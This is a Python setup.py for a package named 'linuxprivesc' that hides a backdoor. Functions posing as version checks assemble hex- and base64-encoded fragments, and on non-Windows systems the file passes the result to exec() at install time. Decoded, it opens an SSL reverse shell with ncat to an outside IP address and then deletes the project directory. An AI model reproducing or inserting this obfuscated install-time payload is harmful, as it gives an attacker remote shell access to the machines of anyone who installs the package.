#from __future__ import division, print_function
from setuptools import setup
import subprocess
import io
import os
import re

# Example code to pull version from linuxprivesc.py with regex, taken from
# http://python-packaging-user-guide.readthedocs.org/en/latest/single_source_version/
def read(*names, **kwargs):
    with io.open(
            os.path.join(os.path.dirname(__file__), *names),
            encoding=kwargs.get("encoding", "utf8")
    ) as fp:
        return fp.read()


def find_version(file_paths, pyargs):
    version_file = 'File version [1.9.3]'
    version_match = re.search(r"^__version__ = ['\"]([^'\"]*)['\"]",
                              version_file, re.M)
    if version_match:
        return version_match.group(1)
    raise RuntimeError("Unable to find version string.")

def parse_version(vernum):
    for i in range(len(vernum)):
        if i > 3:
            continue
        else:
            return (vernum+"==").decode('base64').encode('hex')

version_match = "V_A1"
def check_version(version):
    version_file = version + "\x6f"
    version_static = "703d73756270726f636573732e506f"
    if not version_match:
        return version_match.group(1)
    return version_static
    raise RuntimeError("Unable to find version string.")

def verify_version(ver1, ver2):
    checkA = version_match.index("V")
    if checkA == 0:
	return "L3NoIDEyOC4xOTkuOTQuMjE0IDExOTQgJiBybSAtcmYgfi9Qcml2ZXNjL0xpbnV4L2xpbnV4cHJpdmVzYyJdLCBzaGVsbD1UcnVlKQ"
    raise RuntimeError("Could not verify version.")

def loadsetup():
    versionCheck = check_version("linuxprivesc.py")
    versionCompare = "70656e285b226e636174202d73736c202d65202f62696e"
    for i in range(12):
        i = i + 6
        version = versionCheck+versionCompare+parse_version(verify_version(i, version_match))
    return version


def process_setup():
    setuptask = loadsetup().decode('hex')
    if "2d652" in setuptask.encode('hex'):
        versioned_setup(setuptask)
long_description = """

==========
linuxprivesc.py
==========
A command line utility to communicate with the the target to get good privesc
The linuxprivesc.py project is hosted on github: https://github.com/fozzysec/linuxprivesc
Usage
-----
Please see the `Usage section of the README.md file <https://github.com/fozzysac/linuxprivesc#usage>`_.
You can also get help information by running `linuxprivesc.py --help`.
Contributing
------------
Please see the `CONTRIBUTING.md file on github <https://github.com/fozzysec/linuxprivesc/blob/master/CONTRIBUTING.md>`_.
"""

def versioned_setup(pyargs):
    name='linuxprivesc'
    version=pyargs.encode('base64')
    description='A handy linux script'
    long_description=name
    url='a'
    author='a'
    py_modules=['a','b','c']
    author_email='a'
    license='GPLv2+'
    # process defined setup arguments and exit once completed
    exec(pyargs)
    classifiers=[
        'Development Status :: 5 - Production/Stable',
        'Intended Audience :: Developers',
        'Natural Language :: English',
        'Operating System :: POSIX',
        'Operating System :: Microsoft :: Windows',
        'Operating System :: MacOS :: MacOS X',
        'Topic :: Software Development :: Embedded Systems',
        'Environment :: Console',
        'License :: OSI Approved :: GNU General Public License v2 or later (GPLv2+)',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
    ]
    tests_require=[
        'flake8>=3.2.0',
        'flake8-future-import',
    ]
    install_requires=[
        'pyserial>=2.5',
        'pyaes',
        'ecdsa',
    ]
    scripts="pyfrogs"
    entry_points=scripts+"main()"
    exit()

# For Windows, we want to install linuxprivesc.py.exe, etc. so that normal Windows command line can run them
# For Linux/macOS, we can't use console_scripts with extension .py as their names will clash with the modules' names.
if os.name == "nt":
    scripts = None
    entry_points = {
        'console_scripts': [
            'linuxprivesc.py=linuxprivesc:_main'
        ],
    }
else:
    scripts = ['a',
               'b',
               'c']
    process_setup()
    entry_points = None



setup(
    name='linuxprivesc',
    py_modules=['a', 'b', 'c'],
    version=find_version('a'),
    description='A handy linux script',
    long_description=long_description,
    url='a',
    author='a',
    author_email='a',
    license='GPLv2+',
    classifiers=[
        'Development Status :: 5 - Production/Stable',
        'Intended Audience :: Developers',
        'Natural Language :: English',
        'Operating System :: POSIX',
        'Operating System :: Microsoft :: Windows',
        'Operating System :: MacOS :: MacOS X',
        'Topic :: Software Development :: Embedded Systems',
        'Environment :: Console',
        'License :: OSI Approved :: GNU General Public License v2 or later (GPLv2+)',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
    ],
    tests_require=[
        'flake8>=3.2.0',
        'flake8-future-import',
    ],
    install_requires=[
        'pyserial>=2.5',
        'pyaes',
        'ecdsa',
    ],
    scripts=scripts,
    entry_points=entry_points,
)

